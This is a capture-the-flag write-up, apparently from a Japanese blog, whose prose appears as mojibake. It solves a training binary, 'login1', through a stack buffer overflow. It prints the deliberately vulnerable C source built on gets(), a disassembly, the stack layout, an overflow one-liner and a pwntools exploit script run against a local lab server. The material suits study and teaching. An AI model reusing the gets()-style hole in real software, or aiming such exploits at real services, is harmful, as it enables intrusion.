### ��2�́Flogin1�i�X�^�b�N�o�b�t�@�I�[�o�[�t���[1�j

#### 2.1�F���̊T�v

�\�[�X�R�[�h�ilogin1.c�j�ƁA�v���O�����o�C�i���ilogin1�j���񋟂���Ă��܂��B

[�O��](https://daisuke20240310.hatenablog.com/entry/kaidai_1)�A�Љ���Adocker ���N�����Ă����A�u���E�U�ɃA�N�Z�X���܂��B���}�̂悤�ɁA���ꂼ��̃����N���N���b�N���邱�ƂŁA�_�E�����[�h���邱�Ƃ��o���܂��B

<figure class="figure-image figure-image-fotolife" title="login1">[f:id:daisuke20240310:20250512222106p:plain:alt=login1]<figcaption>login1</figcaption></figure>

#### ���H

�܂��́A���͂ł���Ă����܂��B

�\�w��͂��܂��B���A���s�������Ȃ��̂ŕt�^���Ă����܂��B�܂��A�ŏ�����Aglibc-2.31 �Ɉˑ����C�u������ύX���Ă����܂��i���@�A�o�܂Ȃǂ́A[�V�X�e���ɃC���X�g�[�����ꂽ���̂ƈقȂ�o�[�W������glibc���g�����@](https://daisuke20240310.hatenablog.com/entry/glibc) ���Q�l�ɂ��Ă��������j�B

```sh
$ chmod +x login1

$ cp ./login1 ./login1_patch

$ patchelf --set-rpath /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu --set-interpreter /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so ./login1_patch 

$ ldd ./login1_patch 
	linux-vdso.so.1 (0x00007ffec29b2000)
	libc.so.6 => /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/libc.so.6 (0x00007f17d423e000)
	/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so => /lib64/ld-linux-x86-64.so.2 (0x00007f17d4432000)

$ file login1_patch 
login1_patch: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=5c2c2e406f7a39e4a6d6b95d5a1f3f020d5a40c2, not stripped

$ ~/bin/checksec --file=login1_patch
RELRO          STACK CANARY     NX           PIE     RPATH     RUNPATH     Symbols     FORTIFY  Fortified  Fortifiable  FILE
Partial RELRO  No canary found  NX disabled  No PIE  No RPATH  RW-RUNPATH  75 Symbols  No       0          2            login1_patch

$ pwn checksec --file=login1_patch
[*] '/home/user/svn/experiment/kaidai_pwnable/chapter2/login1_patch'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu'
    Stripped:   No
```

���s���Ă݂܂��B

���T�[�o�[�ɃA�N�Z�X����ƁAflag.txt ���p�ӂ���Ă���Ǝv���܂����A���[�J���Ŏ����Ƃ��ɂ́A�����ŁAflag.txt ����������K�v�����肻���ł��B

��蕶�ɂ���悤�ɁA���O�C���ł���悤�ɂ���΂����悤�ł��B

```sh
$ ./login1_patch 
Failed to read flag.txt

$ nano flag.txt

$ cat flag.txt 
flagflag

$ ./login1_patch 
ID: aaa
Password: bbb
Invalid ID or password
```

�\�[�X�R�[�h�ilogin1.c�j�����Ă����܂��B

setup�֐��́A�������̂��߂̂悤�ł��Bmain�֐�������ƁAID �� admin �ł��邱�Ƃ�������܂��BPassword �́Aflag.txt �̒��g���̂̂悤�ł��B

ok �Ƃ������[�J���ϐ��� 0 �ŏ���������Ă��܂����A1�i��0�j�ɏ��������邱�Ƃ��o����΁A�t���O���ǂݏo�������ł��B

```c
//  gcc login1.c -o login1 -fno-stack-protector -no-pie -fcf-protection=none
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char flag[0x20];

char *gets(char *s);

void setup()
{
    FILE *f = NULL;

    alarm(60);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    f = fopen("flag.txt", "rt");
    if (f == NULL) {
        printf("Failed to read flag.txt\n");
        exit(0);
    }
    fscanf(f, "%s", flag);
    fclose(f);
}

int main()
{
    char id[0x20] = "";
    char password[0x20] = "";
    int ok = 0;

    setup();

    printf("ID: ");
    gets(id);
    printf("Password: ");
    gets(password);

    if (strcmp(id, "admin") == 0 &&
        strcmp(password, flag) == 0)
        ok = 1;

    if (ok) {
        printf("Login Succeeded\n");
        printf("The flag is: %s\n", flag);
    } else
        printf("Invalid ID or password\n");
}
```

GDB �ŋN�����āA�X�^�b�N�̏󋵂��m�F���܂��B

```sh
$ gdb -q login1_patch
Reading symbols from login1_patch...

pwndbg> start
Temporary breakpoint 1 at 0x401290

pwndbg> disassemble
Dump of assembler code for function main:
   0x000000000040128c <+0>:     push   rbp
   0x000000000040128d <+1>:     mov    rbp,rsp
=> 0x0000000000401290 <+4>:     sub    rsp,0x50
   0x0000000000401294 <+8>:     mov    QWORD PTR [rbp-0x30],0x0
   0x000000000040129c <+16>:    mov    QWORD PTR [rbp-0x28],0x0
   0x00000000004012a4 <+24>:    mov    QWORD PTR [rbp-0x20],0x0
   0x00000000004012ac <+32>:    mov    QWORD PTR [rbp-0x18],0x0
   0x00000000004012b4 <+40>:    mov    QWORD PTR [rbp-0x50],0x0
   0x00000000004012bc <+48>:    mov    QWORD PTR [rbp-0x48],0x0
   0x00000000004012c4 <+56>:    mov    QWORD PTR [rbp-0x40],0x0
   0x00000000004012cc <+64>:    mov    QWORD PTR [rbp-0x38],0x0
   0x00000000004012d4 <+72>:    mov    DWORD PTR [rbp-0x4],0x0
   0x00000000004012db <+79>:    mov    eax,0x0
   0x00000000004012e0 <+84>:    call   0x4011b6 <setup>
   0x00000000004012e5 <+89>:    lea    rdi,[rip+0xd3f]        # 0x40202b
   0x00000000004012ec <+96>:    mov    eax,0x0
   0x00000000004012f1 <+101>:   call   0x401060 <printf@plt>
   0x00000000004012f6 <+106>:   lea    rax,[rbp-0x30]
   0x00000000004012fa <+110>:   mov    rdi,rax
   0x00000000004012fd <+113>:   call   0x401090 <gets@plt>
   0x0000000000401302 <+118>:   lea    rdi,[rip+0xd27]        # 0x402030
   0x0000000000401309 <+125>:   mov    eax,0x0
   0x000000000040130e <+130>:   call   0x401060 <printf@plt>
   0x0000000000401313 <+135>:   lea    rax,[rbp-0x50]
   0x0000000000401317 <+139>:   mov    rdi,rax
   0x000000000040131a <+142>:   call   0x401090 <gets@plt>
   0x000000000040131f <+147>:   lea    rax,[rbp-0x30]
   0x0000000000401323 <+151>:   lea    rsi,[rip+0xd11]        # 0x40203b
   0x000000000040132a <+158>:   mov    rdi,rax
   0x000000000040132d <+161>:   call   0x401080 <strcmp@plt>
   0x0000000000401332 <+166>:   test   eax,eax
   0x0000000000401334 <+168>:   jne    0x401354 <main+200>
   0x0000000000401336 <+170>:   lea    rax,[rbp-0x50]
   0x000000000040133a <+174>:   lea    rsi,[rip+0x2d7f]        # 0x4040c0 <flag>
   0x0000000000401341 <+181>:   mov    rdi,rax
   0x0000000000401344 <+184>:   call   0x401080 <strcmp@plt>
   0x0000000000401349 <+189>:   test   eax,eax
   0x000000000040134b <+191>:   jne    0x401354 <main+200>
   0x000000000040134d <+193>:   mov    DWORD PTR [rbp-0x4],0x1
   0x0000000000401354 <+200>:   cmp    DWORD PTR [rbp-0x4],0x0
   0x0000000000401358 <+204>:   je     0x401380 <main+244>
   0x000000000040135a <+206>:   lea    rdi,[rip+0xce0]        # 0x402041
   0x0000000000401361 <+213>:   call   0x401040 <puts@plt>
   0x0000000000401366 <+218>:   lea    rsi,[rip+0x2d53]        # 0x4040c0 <flag>
   0x000000000040136d <+225>:   lea    rdi,[rip+0xcdd]        # 0x402051
   0x0000000000401374 <+232>:   mov    eax,0x0
   0x0000000000401379 <+237>:   call   0x401060 <printf@plt>
   0x000000000040137e <+242>:   jmp    0x40138c <main+256>
   0x0000000000401380 <+244>:   lea    rdi,[rip+0xcdb]        # 0x402062
   0x0000000000401387 <+251>:   call   0x401040 <puts@plt>
   0x000000000040138c <+256>:   mov    eax,0x0
   0x0000000000401391 <+261>:   leave
   0x0000000000401392 <+262>:   ret
End of assembler dump.
```

�X�^�b�N���������܂��B

| �A�h���X | �T�C�Y | ���e |
| - | - | - |
| rbp - 0x50 | 32 | password[32] |
| rbp - 0x30 | 32 | id[32] |
| rbp - 0x10 | 12 | ���g�p |
| rbp - 0x4 | 4 | ok |
| rbp |

�Ȃ�قǁAID ����͂���Ƃ��ɁA32byte �ł͂Ȃ��A48byte ���������݁Aok �̗̈���A��0 �ɂ���Ηǂ������ł��B

```sh
$ python -c 'print("a" * 48, end="")' | ./login1_patch
ID: Password: Login Succeeded
The flag is: flagflag
```

�t���O���\������܂����B

���T�[�o�[�����ɃX�N���v�g���������܂����B

```python
#!/usr/bin/env python3
from pwn import *

bin_file = './login1_patch'
context(os = 'linux', arch = 'amd64')
context(terminal = ['tmux', 'splitw', '-h'])
context.log_level = 'debug'

binf = ELF( bin_file )

def attack( proc, **kwargs ):
    
    id       = "a" * 47 #48
    password = "b" * 31 #32
    
    proc.sendlineafter( 'ID: ', id.encode() )
    proc.sendlineafter( 'Password: ', password.encode() )
    
    info( proc.recvall() )

def main():
    
    adrs = "localhost"
    port = 10001
    
    #proc = gdb.debug( bin_file )
    #proc = process( bin_file )
    proc = remote( adrs, port )
    
    attack( proc )
    #proc.interactive()

if __name__ == '__main__':
    main()
```

���s���Ă݂܂��B

�����ɁA�t���O���\������܂����B

```sh
$ python exploit_login1.py
[*] '/home/user/svn/experiment/kaidai_pwnable/chapter2/login1_patch'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu'
    Stripped:   No
[+] Opening connection to localhost on port 10001: Done
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x4 bytes:
    b'ID: '
[DEBUG] Sent 0x30 bytes:
    b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
[DEBUG] Received 0xa bytes:
    b'Password: '
[DEBUG] Sent 0x20 bytes:
    b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n'
[+] Receiving all data: Done (52B)
[DEBUG] Received 0x34 bytes:
    b'Login Succeeded\n'
    b'The flag is: FLAG{58fd7d9bMJNTjnv5}\n'
[*] Closed connection to localhost port 10001
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] Login Succeeded
    The flag is: FLAG{58fd7d9bMJNTjnv5}
```

<figure class="figure-image figure-image-fotolife" title="login1 Submit">[f:id:daisuke20240310:20250512225942p:plain:alt=login1 Submit]<figcaption>login1 Submit</figcaption></figure>
